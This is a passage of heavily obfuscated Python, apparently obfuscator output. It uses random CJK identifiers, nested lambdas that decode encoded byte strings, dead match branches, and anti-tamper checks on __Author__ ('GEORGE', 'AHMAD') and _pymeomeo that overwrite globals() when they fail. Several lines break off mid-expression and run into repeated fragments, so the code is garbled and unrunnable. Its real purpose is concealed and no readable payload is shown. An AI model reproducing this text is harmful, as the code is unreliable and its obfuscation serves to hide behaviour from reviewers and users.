樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '躎赍乵烺铴薐' == '珱駃飑穸雯壬':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            涷糞抐櫎割琨 = [[True], [False]]
            暽掇財豥硿淳(['嫸鼰孌檵凡瓚'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 豴礧樀蟉晒傦:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                版蓰郄素駿琥 = [[(lambda: (lambda 抄匐癥饨螆氫: 抄匐癥饨螆氫 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 轺亯饞悇甉樒: 轺亯饞悇甉樒 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 轡笾睲痎鴼圙:
        try:
            __Author__
        except:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '蛬堰佚曜书衁' == '逑茨鲍鄩欛夙':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            偄鴄轲岬曥拉 = [[True], [False]]
            暽掇財豥硿淳(['别骷澈鈗較呲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 俭竏綱樂爫覢:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                峎颭掖淟驗偗 = [[(lambda: (lambda 蛐堀恞退樾藞: 蛐堀恞退樾藞 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 蠯裭晰袌掋凤: 蠯裭晰袌掋凤 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 隕霛呪覲蟆榃:
        try:
            _pymeomeo
        except:
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '叧脩眽埨鈚螋' == '輜簁銋厦鱝蕫':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            临恥阴砸簌囒 = [[True], [False]]
            暽掇財豥硿淳(['斱转姜浜受據'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 艸駀鶙儺莿緕:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                都鮿豵餲麒南 = [[(lambda: (lambda 绦騟頒杇籣愂: 绦騟頒杇籣愂 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 司褲掣恝民菏: 司褲掣恝民菏 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 蜩蕅蒔藤喜瑟:
        if __Author__ != ('GEORGE', 'AHMAD'):
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfd'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0b'))()]))))())())() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/:\xdeh\xb1'))()] * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))() * (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/~\x8ah\xc0'))()
try:
    match '鳠存光遦劄战' == '啥祽胋昬沓僬':
        case True:
            raise 燪汼钞嘜嘑飶()
        case False:
            税嵢邐棷綪諶 = [[True], [False]]
            暽掇財豥硿淳(['瑯暳樲牁狧峲'])
    raise 燪汼钞嘜嘑飶()
except 燪汼钞嘜嘑飶 as 世簠詊燦徘鍓:
    try:
        match (lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [3333333333333333333333333333333333333333333333333333333333242422222222222222222722249735, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722262489, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722245298, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722246388, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722256237, 3333333333333333333333333333333333333333333333333333333333242422222222222222222722249530]))))())())():
            case True:
                raise 燪汼钞嘜嘑飶()
            case False:
                籅諛诃鿱徱鲥 = [[(lambda: (lambda 惮茷螫嚎蓛隚: 惮茷螫嚎蓛隚 + (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()], [(lambda: (lambda 倪嚺嚞脲珫臍: 倪嚺嚞脲珫臍 - (lambda: 趄诖狗谦頠鮳(309485009821345068724781056))())(0) == 1)()]]
                暽掇財豥硿淳([(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕
        raise 燪汼钞嘜嘑飶()
    except 燪汼钞嘜嘑飶 as 儂彂揭馎栺茊:
        if _pymeomeo != vars(globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfb'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x05'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\r'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x02'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0c'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()]):
            globals()[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xf8'))()]))))())())()] = [[[[[(lambda: (lambda: (lambda: 雘訡衋筿仺癖(濼颤鳴鼂錙讟(疤啥瘈箚楧忶(躹鐗渃菧驛倕, [(lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x00'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x08'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x0e'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x12'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfe'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06I\x07'))(), (lambda: 樥庆灾讫薝鯴(b'0xFFFFFFFF/\x06\xb3\xda?d\xfbBh\xef\x0e\xce\xbc\x97\xe7hL\x0c\xf7\xcf",\xba\xb6i\xcd\xba\x95l\xbc\xd8\xb0\xae\xa3T\x06H\xfc'))(), (lambda: 